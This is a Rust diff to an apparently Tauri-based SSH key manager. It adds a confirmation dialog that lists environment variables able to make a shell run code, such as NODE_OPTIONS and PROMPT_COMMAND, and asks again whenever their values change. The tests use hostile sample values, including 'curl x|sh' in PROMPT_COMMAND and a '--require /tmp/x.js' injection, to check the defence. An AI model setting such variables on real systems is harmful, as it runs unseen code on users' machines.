@@ -7,16 +7,22 @@
 //!
 //! - an environment's secret values going into a shell's environment or into
 //!   a file the app writes ([`confirm_env_secrets`]): asked once per
-//!   environment and use while the vault stays unlocked;
+//!   environment and use while the vault stays unlocked; and before a shell
+//!   gets variables that make it or the programs it starts run code
+//!   (`PATH`, `NODE_OPTIONS`, `GIT_SSH_COMMAND`…), secret or not, listed
+//!   with their values and asked again once they change;
 //! - single secrets shown on the page or copied to the clipboard
 //!   ([`take_secret`]): ten in a row are free, then one every six minutes;
 //!   each one past that is asked for.
 
 use std::collections::BTreeSet;
+use std::fmt::Write as _;
 use std::sync::{Mutex, MutexGuard, Once, PoisonError};
 use std::time::{Duration, Instant};
 
+use sha2::{Digest, Sha256};
 use sshkm_core::vault::envs::{self, EnvFile};
+use sshkm_core::{ExposeSecret, SecretString};
 use tauri::{AppHandle, Listener};
 
 use crate::confirm::{self, Localized};
@@ -64,29 +70,100 @@ pub fn confirm_env_secrets(
     env: &str,
     to: &EnvUse<'_>,
 ) -> AppResult<()> {
-    let (label, secrets) = state.vault.with(app, |vault| {
+    gate_env(app, state, env, to).map(drop)
+}
+
+/// [`confirm_env_secrets`] before a shell gets the environment `env`:
+/// returns its variables as they were when the dialog was shown (or, with
+/// no dialog, when they were read). The shell gets exactly those, so a
+/// change made while the dialog is open never goes in unseen; it is asked
+/// about the next time.
+pub fn confirm_shell_env(app: &AppHandle, state: &AppState, env: &str) -> AppResult<Vec<EnvVar>> {
+    gate_env(app, state, env, &EnvUse::Shell)
+}
+
+/// Reads `env` once and asks about it as [`gate`] does, in a native dialog.
+fn gate_env(
+    app: &AppHandle,
+    state: &AppState,
+    env: &str,
+    to: &EnvUse<'_>,
+) -> AppResult<Vec<EnvVar>> {
+    let read = state.vault.with(app, |vault| {
         let summary = vault.environment(env)?.summary;
-        Ok((
-            envs::label(Some(&vault.env_label(&summary)), &summary.name),
-            summary.secret_count,
-        ))
+        // A shell gets every variable; those that make it, or a program it
+        // starts, run code are named with their values, secret or not.
+        let vars = match to {
+            EnvUse::Shell => vault
+                .env_variables(env)?
+                .into_iter()
+                .map(|var| (var.name, var.value))
+                .collect(),
+            EnvUse::File(_) => Vec::new(),
+        };
+        Ok(EnvRead {
+            label: envs::label(Some(&vault.env_label(&summary)), &summary.name),
+            secrets: summary.secret_count,
+            vars,
+        })
     })?;
-    if secrets == 0 {
-        return Ok(());
-    }
     WATCH_LOCK.call_once(|| {
         for event in [crate::vault::LOCKED_EVENT, crate::vault::UNLOCKED_EVENT] {
             app.listen_any(event, |_| let_out().forget());
         }
     });
-    let key = to.key(env);
-    let Some(asked) = let_out().ask(&key) else {
-        return Ok(());
-    };
-    let (title, body, approve) = env_question(&label, secrets, to);
-    confirm::require(app, &title, &body, &approve)?;
-    let_out().record(&key, asked);
-    Ok(())
+    gate(
+        &LET_OUT,
+        &to.key(env),
+        read,
+        to,
+        |(title, body, approve)| confirm::require(app, &title, &body, &approve),
+    )
+}
+
+/// An environment as one read of the vault found it, for [`gate`].
+struct EnvRead {
+    /// Its label, as the dialog names it.
+    label: String,
+    /// How many of its values are secret.
+    secrets: u32,
+    /// Its variables, for a shell; none for a file.
+    vars: Vec<EnvVar>,
+}
+
+/// Asks with `ask` before `read`'s values go `to` where they go (`key`
+/// names the environment and use), unless it has neither secret values nor
+/// variables that run code, or a yes for it, and for those variables as
+/// they are, was kept in `let_out`. Returns `read`'s variables: what the
+/// question was about, never a later read.
+fn gate(
+    let_out: &Mutex<LetOut>,
+    key: &str,
+    read: EnvRead,
+    to: &EnvUse<'_>,
+    ask: impl FnOnce((Localized, Localized, Localized)) -> AppResult<()>,
+) -> AppResult<Vec<EnvVar>> {
+    let code: Vec<CodeVar> = read
+        .vars
+        .iter()
+        .filter(|(name, _)| envs::runs_code(name))
+        .cloned()
+        .collect();
+    if read.secrets == 0 && code.is_empty() {
+        return Ok(read.vars);
+    }
+    // Asked again once those variables changed, names or values.
+    let key = code_key(key, &code);
+    let asked = lock(let_out).ask(&key);
+    if let Some(asked) = asked {
+        ask(if code.is_empty() {
+            env_question(&read.label, read.secrets, to)
+        } else {
+            code_question(&read.label, read.secrets, &code)
+        })?;
+        lock(let_out).record(&key, asked);
+    }
+    Ok(read.vars)
 }
 
 /// The dialog's title, text and button: the environment, as its label names
@@ -163,6 +240,135 @@ fn env_question(label: &str, secrets: u32, to: &EnvUse<'_>) -> (Localized, Local
     }
 }
 
+/// An environment's variable as a shell gets it: its name and value.
+pub type EnvVar = (String, SecretString);
+
+/// A variable that makes a shell, or a program it starts, run code
+/// ([`envs::runs_code`]): its name and value.
+type CodeVar = EnvVar;
+
+/// Most such variables a dialog lists.
+const SHOWN_CODE_VARS: usize = 12;
+/// Longest value a dialog shows whole; a longer one shows its start and
+/// its end.
+const SHOWN_VALUE: usize = 160;
+
+/// `key`, and if the environment has variables that run code, a SHA-256 of
+/// their names and values: a yes to them holds until they change. Kept in
+/// memory only, like the answers.
+fn code_key(key: &str, code: &[CodeVar]) -> String {
+    if code.is_empty() {
+        return key.to_owned();
+    }
+    let mut hash = Sha256::new();
+    for (name, value) in code {
+        hash.update(name.as_bytes());
+        hash.update([0]);
+        hash.update(value.expose_secret().as_bytes());
+        hash.update([0]);
+    }
+    let digest = hash.finalize();
+    let mut key = format!("{key}:code:");
+    for byte in digest {
+        let _ = write!(key, "{byte:02x}");
+    }
+    key
+}
+
+/// A value as the dialog shows it ([`confirm::shown`]): whole up to
+/// [`SHOWN_VALUE`] characters, else its start and its end, with how many
+/// characters are left out between them.
+fn shown_value(value: &str) -> String {
+    let count = value.chars().count();
+    if count <= SHOWN_VALUE {
+        return confirm::shown(value, SHOWN_VALUE);
+    }
+    let (head, tail) = (SHOWN_VALUE * 2 / 3, SHOWN_VALUE / 3);
+    let start: String = value.chars().take(head).collect();
+    let end: String = value.chars().skip(count - tail).collect();
+    format!(
+        "{}… (+{}) …{}",
+        confirm::shown(&start, head),
+        count - head - tail,
+        confirm::shown(&end, tail)
+    )
+}
+
+/// The dialog before a shell gets an environment with variables that make
+/// it, or the programs it starts, run code (`code`): they are listed with
+/// their values, so a user who didn't set them, or doesn't know them, can
+/// say no.
+fn code_question(label: &str, secrets: u32, code: &[CodeVar]) -> (Localized, Localized, Localized) {
+    let env = confirm::shown(label, 120);
+    let lines: Vec<String> = code
+        .iter()
+        .take(SHOWN_CODE_VARS)
+        .map(|(name, value)| {
+            format!(
+                "• {}={}",
+                confirm::shown(name, 80),
+                shown_value(value.expose_secret())
+            )
+        })
+        .collect();
+    let more = code.len().saturating_sub(SHOWN_CODE_VARS);
+    let list = |more_text: String| {
+        let mut all = lines.clone();
+        if more > 0 {
+            all.push(more_text);
+        }
+        all.join("\n")
+    };
+    let (en, ru, uz) = (
+        list(format!("…and {more} more")),
+        list(format!("…и ещё {more}")),
+        list(format!("…va yana {more} ta")),
+    );
+    let (en_secrets, ru_secrets, uz_secrets) = match secrets {
+        0 => (String::new(), String::new(), String::new()),
+        1 => (
+            ", including 1 secret value".to_owned(),
+            "; секретных среди них: 1".to_owned(),
+            ", ulardan 1 tasi maxfiy".to_owned(),
+        ),
+        n => (
+            format!(", including {n} secret values"),
+            format!("; секретных среди них: {n}"),
+            format!(", ulardan {n} tasi maxfiy"),
+        ),
+    };
+    (
+        Localized::new(
+            "Open a terminal with variables that run code?",
+            "Открыть терминал с переменными, которые запускают код?",
+            "Terminal kod ishga tushiradigan oʻzgaruvchilar bilan ochilsinmi?",
+        ),
+        Localized::new(
+            format!(
+                "The shell gets the variables of “{env}”{en_secrets}. These make the shell, or \
+                 programs it starts, run code:\n\n{en}\n\nYou won’t be asked again for this \
+                 environment until the vault locks or these change. Continue only if you \
+                 opened this terminal yourself and trust these values."
+            ),
+            format!(
+                "Оболочка получит переменные окружения «{env}»{ru_secrets}. Эти переменные \
+                 заставляют оболочку или запущенные из неё программы выполнять код:\n\n{ru}\n\n\
+                 Для этого окружения вопрос не повторится, пока хранилище не заблокируется или \
+                 эти значения не изменятся. Продолжайте, только если этот терминал открыли вы и \
+                 вы доверяете этим значениям."
+            ),
+            format!(
+                "Shell «{env}» muhitining oʻzgaruvchilarini oladi{uz_secrets}. Bu \
+                 oʻzgaruvchilar shell yoki undan ishga tushgan dasturlarni kod bajarishga majbur \
+                 qiladi:\n\n{uz}\n\nOmbor qulflanmaguncha yoki bu qiymatlar oʻzgarmaguncha bu \
+                 muhit uchun qayta soʻralmaydi. Bu terminalni oʻzingiz ochgan va bu qiymatlarga \
+                 ishonsangizgina davom eting."
+            ),
+        ),
+        Localized::new("Open terminal", "Открыть терминал", "Terminalni ochish"),
+    )
+}
+
 /// What was let out, and how many times the answers were forgotten, so a
 /// yes that comes after the vault locked isn't kept.
 struct LetOut {
@@ -199,7 +405,11 @@ impl LetOut {
 }
 
 fn let_out() -> MutexGuard<'static, LetOut> {
-    LET_OUT.lock().unwrap_or_else(PoisonError::into_inner)
+    lock(&LET_OUT)
+}
+
+fn lock(let_out: &Mutex<LetOut>) -> MutexGuard<'_, LetOut> {
+    let_out.lock().unwrap_or_else(PoisonError::into_inner)
 }
 
 // --- Single secrets -----------------------------------------------------------
@@ -432,6 +642,8 @@ impl Bucket {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::error::AppError;
+    use sshkm_core::ErrorCode;
 
     #[test]
     fn an_environment_is_asked_for_once_per_use_until_the_vault_locks() {
@@ -500,6 +712,149 @@ mod tests {
         );
     }
 
+    fn value<'a>(vars: &'a [EnvVar], name: &str) -> &'a str {
+        vars.iter()
+            .find(|(n, _)| n == name)
+            .map(|(_, value)| value.expose_secret())
+            .unwrap()
+    }
+
+    #[test]
+    fn a_shell_gets_the_variables_the_user_was_shown() {
+        let let_out = Mutex::new(LetOut::new());
+        let vault = Mutex::new(code(&[
+            ("NODE_OPTIONS", "--max-old-space-size=4096"),
+            ("API_URL", "https://api.example"),
+        ]));
+        let read = || EnvRead {
+            label: "Shop · prod".into(),
+            secrets: 0,
+            vars: vault.lock().unwrap().clone(),
+        };
+        let key = EnvUse::Shell.key("env-1");
+        // The environment changes while the dialog is open.
+        let vars = gate(&let_out, &key, read(), &EnvUse::Shell, |(_, body, _)| {
+            assert!(body.en.contains("NODE_OPTIONS=--max-old-space-size=4096"));
+            vault.lock().unwrap()[0].1 = SecretString::from("--require /tmp/x.js");
+            Ok(())
+        })
+        .unwrap();
+        // The shell gets what was shown, not the change.
+        assert_eq!(value(&vars, "NODE_OPTIONS"), "--max-old-space-size=4096");
+        assert_eq!(vars.len(), 2);
+
+        // The next shell is asked about the change; a no starts none.
+        let mut shown = None;
+        let refused = gate(&let_out, &key, read(), &EnvUse::Shell, |(_, body, _)| {
+            shown = Some(body.en);
+            Err(AppError::new(ErrorCode::Cancelled, "not approved"))
+        });
+        assert!(refused.is_err());
+        assert!(shown.unwrap().contains("NODE_OPTIONS=--require /tmp/x.js"));
+
+        // Back as it was approved: no question, and the shell gets it.
+        vault.lock().unwrap()[0].1 = SecretString::from("--max-old-space-size=4096");
+        let vars = gate(&let_out, &key, read(), &EnvUse::Shell, |_| {
+            panic!("asked again for what was approved")
+        })
+        .unwrap();
+        assert_eq!(value(&vars, "NODE_OPTIONS"), "--max-old-space-size=4096");
+
+        // Without secrets or such variables, nothing is asked.
+        let plain = EnvRead {
+            label: "dev".into(),
+            secrets: 0,
+            vars: code(&[("API_URL", "https://api.example")]),
+        };
+        let vars = gate(&let_out, "shell:env-2", plain, &EnvUse::Shell, |_| {
+            panic!("asked for an environment without secrets or code")
+        })
+        .unwrap();
+        assert_eq!(value(&vars, "API_URL"), "https://api.example");
+    }
+
+    fn code(vars: &[(&str, &str)]) -> Vec<CodeVar> {
+        vars.iter()
+            .map(|(name, value)| ((*name).to_owned(), SecretString::from(*value)))
+            .collect()
+    }
+
+    #[test]
+    fn variables_that_run_code_are_listed_with_their_values() {
+        let vars = code(&[
+            ("NODE_OPTIONS", "--max-old-space-size=4096"),
+            ("PROMPT_COMMAND", "curl x\n|sh\u{202E}"),
+        ]);
+        let (title, body, _) = code_question("Shop · prod", 0, &vars);
+        assert_eq!(title.en, "Open a terminal with variables that run code?");
+        assert!(
+            body.en
+                .starts_with("The shell gets the variables of “Shop · prod”. ")
+        );
+        assert!(
+            body.en
+                .contains("• NODE_OPTIONS=--max-old-space-size=4096\n")
+        );
+        // Nothing in a value can add lines or turn the text around.
+        assert!(
+            body.en
+                .contains("• PROMPT_COMMAND=curl x<U+000A>|sh<U+202E>\n")
+        );
+        assert!(body.ru.contains("NODE_OPTIONS=--max-old-space-size=4096"));
+        assert!(body.uz.contains("NODE_OPTIONS=--max-old-space-size=4096"));
+        let (_, body, _) = code_question("Shop · prod", 2, &vars);
+        assert!(
+            body.en
+                .contains("“Shop · prod”, including 2 secret values. These make")
+        );
+
+        // A long value shows its start and its end.
+        let long = format!("--require {}/x.js", "a".repeat(400));
+        let shown = shown_value(&long);
+        assert!(shown.starts_with("--require aaa"), "{shown}");
+        assert!(shown.ends_with("aaa/x.js"), "{shown}");
+        assert!(shown.contains("… (+"), "{shown}");
+        assert!(shown.chars().count() < SHOWN_VALUE + 20, "{shown}");
+        assert_eq!(shown_value("short"), "short");
+
+        // Only so many are listed.
+        let many: Vec<CodeVar> = (0..15)
+            .map(|n| (format!("GIT_CONFIG_KEY_{n}"), SecretString::from("x")))
+            .collect();
+        let (_, body, _) = code_question("dev", 0, &many);
+        assert!(body.en.contains("…and 3 more"));
+        assert!(!body.en.contains("GIT_CONFIG_KEY_14"));
+    }
+
+    #[test]
+    fn a_yes_to_variables_that_run_code_holds_until_they_change() {
+        let shell = EnvUse::Shell.key("env-1");
+        let before = code(&[("NODE_OPTIONS", "--max-old-space-size=4096")]);
+        assert_eq!(code_key(&shell, &[]), shell);
+        let again = code(&[("NODE_OPTIONS", "--max-old-space-size=4096")]);
+        assert_eq!(code_key(&shell, &before), code_key(&shell, &again));
+        let mut let_out = LetOut::new();
+        let asked = let_out.ask(&code_key(&shell, &before)).unwrap();
+        let_out.record(&code_key(&shell, &before), asked);
+        assert!(let_out.ask(&code_key(&shell, &before)).is_none());
+        // Another value, another name, or one more: asked again.
+        for changed in [
+            code(&[("NODE_OPTIONS", "--require ./x.js")]),
+            code(&[("NODE_PATH", "--max-old-space-size=4096")]),
+            code(&[
+                ("NODE_OPTIONS", "--max-old-space-size=4096"),
+                ("BASH_ENV", "~/.x"),
+            ]),
+        ] {
+            assert!(let_out.ask(&code_key(&shell, &changed)).is_some());
+        }
+        // Names and values can't run into each other.
+        assert_ne!(
+            code_key(&shell, &code(&[("AB", "C")])),
+            code_key(&shell, &code(&[("A", "BC")]))
+        );
+    }
+
     /// Takes one from `bucket` at `start + seconds`; whether it had to ask,
     /// with the user saying `yes`.
     fn take_at(bucket: &Mutex<Bucket>, start: Instant, seconds: u64, yes: bool) -> (bool, bool) {
@@ -509,10 +864,7 @@ mod tests {
             if yes {
                 Ok(())
             } else {
-                Err(crate::error::AppError::new(
-                    sshkm_core::ErrorCode::Cancelled,
-                    "not approved",
-                ))
+                Err(AppError::new(ErrorCode::Cancelled, "not approved"))
             }
         });
         (asked, result.is_ok())
